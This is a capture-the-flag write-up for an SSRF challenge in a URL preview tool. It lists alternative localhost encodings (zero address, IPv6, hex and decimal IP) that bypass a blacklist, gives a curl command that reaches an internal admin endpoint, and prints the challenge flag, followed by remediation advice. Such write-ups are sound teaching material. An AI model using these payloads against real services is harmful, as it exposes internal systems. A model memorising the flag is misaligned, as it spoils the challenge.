# WEB-03 Writeup: SSRF to Internal Service

## Reconnaissance

1. Visit LinkPeek URL preview tool
2. Enter `https://example.com` → returns page content (confirms URL fetch)
3. Try `http://127.0.0.1:8080` → "Access to internal hosts is restricted"
4. The filter blocks `127.0.0.1` and `localhost` → classic SSRF blacklist

## Exploitation

### Bypass the Blacklist

The filter only blocks exact string matches. Alternative localhost representations:

```
http://0.0.0.0:8080/flag          ← zero address (resolves to loopback)
http://[::1]:8080/flag             ← IPv6 loopback
http://0x7f000001:8080/flag        ← hex encoding
http://2130706433:8080/flag        ← decimal IP
```

### Get the Flag

```bash
curl -X POST http://target/ -d "url=http://0.0.0.0:8080/flag"
```

Response:
```json
{
    "status": "success",
    "service": "Internal Admin API",
    "flag": "FLAG{web_03_ssrf_internal_d8v5}",
    "message": "Congratulations! You reached the internal service via SSRF."
}
```

## Flag

```
FLAG{web_03_ssrf_internal_d8v5}
```

## Remediation

- Use allowlists instead of blocklists
- Resolve DNS and check the IP against RFC 1918 ranges AFTER resolution
- Use a dedicated HTTP proxy with egress filtering
- Disable `file_get_contents()` for URL fetching; use cURL with strict options
